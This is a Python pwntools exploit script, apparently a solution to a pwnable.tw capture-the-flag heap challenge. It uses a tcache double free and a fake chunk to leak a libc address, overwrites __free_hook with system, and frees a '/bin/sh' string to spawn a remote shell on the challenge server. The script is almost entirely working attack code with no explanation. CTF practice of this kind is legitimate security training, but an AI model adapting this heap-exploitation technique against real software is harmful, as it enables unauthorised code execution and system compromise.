from pwn import *
#io = remote('127.0.0.1',4000)
io = remote('chall.pwnable.tw',10207)
def alloc(size,data):
    io.recvuntil('choice :')
    io.sendline('1')
    io.recvuntil('Size:')
    io.sendline(size)
    io.recvuntil('Data:')
    io.send(data)

def free():
    io.recvuntil('choice :')
    io.sendline('2')

def view():
    io.recvuntil('choice :')
    io.sendline('3')
    io.recvuntil('Name :')
    return io.recv(0x20)

io.recvuntil('Name:')
io.send('/bin/sh\x00' + p64(0xc1) + p64(0))

alloc(str(15), '1')
#free()
#alloc(str(31), '2')
#alloc(str(15), '3')
free()
free()
alloc(str(15), '\x00\x00')
alloc(str(15), p64(0x602070))
payload1 = p64(0) + p64(0x251) + p64(0x0707070707070701) + p64(0x0707070707070707)
payload1 = payload1.ljust(0x50,'\x00')
payload1 += p64(0x602070)*16
alloc(str(15), payload1)

payload2 = p64(0)*3 + p64(0x602070)
payload2 = payload2.ljust(0xb8, '\x00')
payload2 += p64(0x21) + p64(0) + p64(0) + p64(0) + p64(0x21)
alloc(str(15), payload2)
#free()
#raw_input()
free()
s = u64(view()[16:24])
libc_base = s - 0x3ebca0
print(hex(libc_base))
#raw_input()
free_hook = libc_base + 0x3ed8e8
system = libc_base + 0x4f440
#for i in range(2):
#    print(i)
#    alloc(str(15), p64(0x602070) + p64(0)*2 + p64(0x602070))
alloc(str(31), p64(free_hook))
alloc(str(47), p64(free_hook))
alloc(str(47), p64(system))
alloc(str(63), p64(0)*3 + p64(0x602060))
#raw_input()
free()
#raw_input()
io.interactive()




